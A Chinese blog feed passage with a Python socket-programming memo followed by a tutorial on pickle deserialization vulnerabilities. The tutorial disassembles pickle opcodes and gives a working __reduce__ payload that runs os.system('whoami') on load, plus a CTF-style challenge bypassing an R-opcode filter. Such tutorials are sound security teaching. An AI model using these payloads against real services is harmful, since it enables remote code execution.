        <span class="token keyword">break</span>
    tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
    	<span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt loading="lazy"></p>
<h3 id="UDP时间戳服务器"><a href="#UDP时间戳服务器" class="headerlink" title="UDP时间戳服务器"></a>UDP时间戳服务器</h3><p>服务器</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime

HOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

udpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span>
udpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for message..."</span><span class="token punctuation">)</span>
    data<span class="token punctuation">,</span> addr <span class="token operator">=</span> udpSerSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>
    udpSerSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...received from and returned to :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
udpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>客户端</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>

HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

udpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    udpCliSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ADDR<span class="token punctuation">)</span>
    data<span class="token punctuation">,</span> ADDR <span class="token operator">=</span> udpCliSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
    	<span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
udpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt loading="lazy"></p>
<h3 id="scoketserver模块"><a href="#scoketserver模块" class="headerlink" title="scoketserver模块"></a>scoketserver模块</h3><p><code>socketserver</code>是标准库中的一个高级别的模块。用于简化实现网络客户端与服务器所需要的大量样板代码。模块中已经实现了一些可以使用的类</p>
<table>
<thead>
<tr>
<th align="center">类</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BaseServer</td>
<td align="center">包含核心服务器功能和mix-in的钩子，仅用于推导，不创建类的实例</td>
</tr>
<tr>
<td align="center">TCPServer/UDPServer</td>
<td align="center">基础的网络同步TCP/UDP服务器</td>
</tr>
<tr>
<td align="center">UnixStreamServer/UnixDatagramServer</td>
<td align="center">基于文件的基础同步TCP/UDP服务器</td>
</tr>
<tr>
<td align="center">BaseRequestHandler</td>
<td align="center">包含处理服务器请求的核心功能，仅用于推导，不创建类的实例</td>
</tr>
<tr>
<td align="center">StreamRequestHandler/DatagramRequestHandler</td>
<td align="center">实现TCP/UDP服务器的服务处理器</td>
</tr>
</tbody></table>
<h3 id="scoketserver-TCP-服务器"><a href="#scoketserver-TCP-服务器" class="headerlink" title="scoketserver TCP 服务器"></a>scoketserver TCP 服务器</h3><p>服务器</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socketserver <span class="token keyword">import</span> <span class="token punctuation">(</span>TCPServer <span class="token keyword">as</span> TCP<span class="token punctuation">,</span> StreamRequestHandler <span class="token keyword">as</span> SRH<span class="token punctuation">)</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime

HOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">MyRequestHandler</span><span class="token punctuation">(</span>SRH<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...conneceted from :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

tcpServ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>ADDR<span class="token punctuation">,</span>MyRequestHandler<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"waiting for connection..."</span><span class="token punctuation">)</span>
tcpServ<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>客户端</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>

HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
	tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
		<span class="token keyword">break</span>
	tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"&#123;&#125;\r\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
		<span class="token keyword">break</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python反序列化漏洞浅析</title>
    <url>/posts/488d0f65/</url>
    <content><![CDATA[<h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt loading="lazy"></p>
<p>以上例子简单的示范了python进行序列化和反序列化的操作</p>
<span id="more"></span>

<h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p>
<ul>
<li>反汇编一个已经被打包的字符串   <code>pickletools.dis</code></li>
<li>优化一个已经被打包的字符串       <code>pickletools.optimize</code></li>
<li>返回一个迭代器来供程序使用       <code>pickletools.genops</code></li>
</ul>
<p>一般我们使用前两个功能，可以先看一下效果：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python反序列化漏洞浅析/image-20200405205451074.png" style="zoom:80%;" loading="lazy">

<p>这就是反汇编的功能，解析那个字符串，然后告诉你这个字符串干了什么，每一行都是一条指令</p>
<p>序列化结构示意图（转）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt loading="lazy"></p>
<p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p>
<p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p>
<p>下面我们试图来序列化一个类</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools
<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>
        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>
        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>
        
today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>
x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment">#优化，消除未使用的PUT</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>     <span class="token comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre>

<p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p>
<ul>
<li><strong>v0</strong> 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li>
<li><strong>v1</strong> 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
<li><strong>v2</strong> 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</li>
<li><strong>v3</strong> 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
<li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li>
</ul>
<p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">b<span class="token string">'\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.'</span>    
    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>
    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'__main__ dairy'</span>
   <span class="token number">18</span>: <span class="token punctuation">)</span>    EMPTY_TUPLE
   <span class="token number">19</span>: <span class="token punctuation">\</span>x81 NEWOBJ
   <span class="token number">20</span>: <span class="token punctuation">&#125;</span>    EMPTY_DICT
   <span class="token number">21</span>: <span class="token punctuation">(</span>    MARK
   <span class="token number">22</span>: X        BINUNICODE <span class="token string">'date'</span>
   <span class="token number">31</span>: J        BININT     <span class="token number">20202020</span>
   <span class="token number">36</span>: X        BINUNICODE <span class="token string">'text'</span>
   <span class="token number">45</span>: X        BINUNICODE <span class="token string">'语言'</span>
   <span class="token number">56</span>: X        BINUNICODE <span class="token string">'tode'</span>
   <span class="token number">65</span>: <span class="token punctuation">]</span>        EMPTY_LIST
   <span class="token number">66</span>: <span class="token punctuation">(</span>        MARK
   <span class="token number">67</span>: X            BINUNICODE <span class="token string">'计'</span>
   <span class="token number">75</span>: X            BINUNICODE <span class="token string">'算'</span>
   <span class="token number">83</span>: X            BINUNICODE <span class="token string">'机'</span>
   <span class="token number">91</span>: e            APPENDS    <span class="token punctuation">(</span>MARK at <span class="token number">66</span><span class="token punctuation">)</span>
   <span class="token number">92</span>: u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">21</span><span class="token punctuation">)</span>
   <span class="token number">93</span>: b    BUILD
   <span class="token number">94</span>: <span class="token builtin class-name">.</span>    STOP
highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre>

<p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p>
<p>下面对优化后的代码一行一行的进行解释</p>
<pre class="language-none"><code class="language-none">0: \x80 PROTO      3</code></pre>

<p><code>\x80</code>：版本(<code>protocol</code>)2后加入，机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。代表这个是依据3号协议序列化的字符串，随后这个操作结束。</p>
<pre class="language-none"><code class="language-none">2: c    GLOBAL     &#39;__main__ dairy&#39;</code></pre>

<p><code>c</code>操作符：连续读取两个字符串<code>module</code>和<code>name</code>，规定以<code>\n</code>为分割给<code>find_class</code>方法，然后把<code>module.name</code>压入栈，现在读取到的是<code>main.dairy</code>，放入栈中，通常用来获取一个模块中的属性</p>
<pre class="language-none"><code class="language-none">18: )    EMPTY_TUPLE</code></pre>

<p><code>)</code>操作符：把一个空的<code>tuple</code>压入当前栈</p>
<pre class="language-none"><code class="language-none">19: \x81 NEWOBJ</code></pre>

<p><code>\x81</code>操作符：从栈中先弹出一个元素，记为<code>args</code>，再弹出一个元素记为<code>cls</code>，接下来执行<code>cls.new(cls,*args)</code>，然后把得到的东西压入栈，简单来说，从栈中弹出一个参数和一个<code>class</code>，然后利用这个参数实例化<code>class</code>，把得到的实例压入栈 </p>
<pre class="language-none"><code class="language-none">20: &#125;    EMPTY_DICT</code></pre>

<p><code>&#125;</code>操作符：把一个空的<code>dict</code>压进栈</p>
<pre class="language-none"><code class="language-none">21: (    MARK</code></pre>

<p>MARK操作符：这个操作符干的事称为<code>load_mark</code>，把当前栈这个整体，作为一个<code>list</code>，压进前序栈，把当前栈清空</p>
<pre class="language-none"><code class="language-none">22: X        BINUNICODE &#39;date&#39;</code></pre>

<p><code>X</code>操作符：和V操作符一样是读入字符串压入堆栈，后面跟的四个字节代表字符串长度，如：<code>X\x04\x00\x00\x00date</code></p>
<pre class="language-none"><code class="language-none">31: J        BININT     20202020</code></pre>

<p>J操作符：和X和V一样，只不过这个是4字节发的int型（个人理解）</p>
<pre class="language-none"><code class="language-none">65: ]        EMPTY_LIST</code></pre>

<p><code>]</code>操作符，把一个空的<code>list</code>压进栈</p>
<pre class="language-none"><code class="language-none">91: e            APPENDS    (MARK at 66)</code></pre>

<p>MARK结束，通过最上面的（66行）堆栈片扩展堆栈上的列表，简单来说就是形成一个列表（个人理解）</p>
<pre class="language-none"><code class="language-none">92: u        SETITEMS   (MARK at 21)</code></pre>

<p>调用<code>pop_mark</code>，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态，从27行开始区分键值对，两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value</p>
<pre class="language-none"><code class="language-none">93: b    BUILD</code></pre>

<p>把当前栈栈顶存进<code>state</code>，然后弹掉，把当前栈顶记为<code>inst</code>，然后弹掉，利用<code>state</code>这系列的值来更新实例<code>inst</code>，把得到的对象扔到当前栈，如果<code>inst</code>拥有<code>__setstate__</code>方法，则吧<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。实际上这里就有一个安全漏洞</p>
<pre class="language-none"><code class="language-none">94: .    STOP</code></pre>

<p><code>.</code>：STOP指令，当前栈顶元素就是反序列化的最终结果，把他弹出</p>
<p><strong>附加：</strong></p>
<p><code>V</code>操作符：读入一个字符串，以<code>\n</code>结尾；然后把这个字符串压进栈中。</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a>__reduce__</h4><p><code>__reduce__</code>的指令码为<code>R</code>，他在反序列化的时候干了这么一件事</p>
<ul>
<li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li>
<li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li>
<li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li>
</ul>
<p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools
<span class="token keyword">import</span> os
<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>
        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>
        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                      <span class="token comment">#反序列化时执行，底层编码方法使用R指令码，</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#print(pickle.dumps(today))</span>
x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>
x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">#优化，消除未使用的PUT</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>           <span class="token comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre>

<p>得到以下结果</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">b<span class="token string">'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>
    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>
    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'nt system'</span>
   <span class="token number">13</span>: X    BINUNICODE <span class="token string">'whoami'</span>
   <span class="token number">24</span>: <span class="token punctuation">\</span>x85 TUPLE1
   <span class="token number">25</span>: R    REDUCE
   <span class="token number">26</span>: <span class="token builtin class-name">.</span>    STOP
highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre>

<p>随后将序列化的内容反序列化</p>
<pre class="language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token string">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>
hack <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b<span class="token punctuation">)</span></code></pre>

<p>随后就可得到命令执行的结果</p>
<h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade
    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># 定义内置方法,当判断两个对象的值是否相等时，触发此方法</span>
        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade
        <span class="token comment">#is比较地址</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>student<span class="token punctuation">(</span><span class="token string">'czj'</span><span class="token punctuation">,</span><span class="token string">'extrader'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> blue

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>
    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>
    <span class="token keyword">return</span> <span class="token string">'well done!'</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code></pre>

<p><code>blue.py</code>中：</p>
<pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>
grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre>

<p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p>
<p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt loading="lazy"></p>
<p>但是在我们不知道blue.py的前提下如何绕过呢？这里就要用到我们的c指令码了</p>
<p>c指令码是专门用来获取一个全局变量的</p>
<p>先看一下反汇编后输出的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt loading="lazy"></p>
